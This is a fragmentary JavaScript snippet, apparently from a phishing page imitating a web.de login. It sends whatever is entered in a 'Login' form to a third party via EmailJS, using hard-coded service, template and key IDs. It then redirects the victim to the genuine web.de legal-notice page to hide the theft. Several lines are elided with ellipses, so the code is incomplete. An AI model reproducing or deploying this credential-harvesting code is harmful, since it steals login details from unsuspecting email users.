...
document.getElementById("form").addEventListener("submit", function (event) {
  ...
  const templateID = "template_rl87d5l";

  emailjs.sendForm(serviceID, templateID, this).then(
    () => {
      btn.value = "Login";
      window.location.href = "https://web.de/impressum/"; // Redirect to the desired link
    },
    (err) => {
      btn.value = "Login";
...
(function () {
  emailjs.init("LIoxyuZnz7mKafp5W");
})();
document
  ...
  .addEventListener("submit", function (event) {
    ...
    emailjs.send("service_yum21n8", "template_rl87d5l", templateParams).then(
      function (response) {
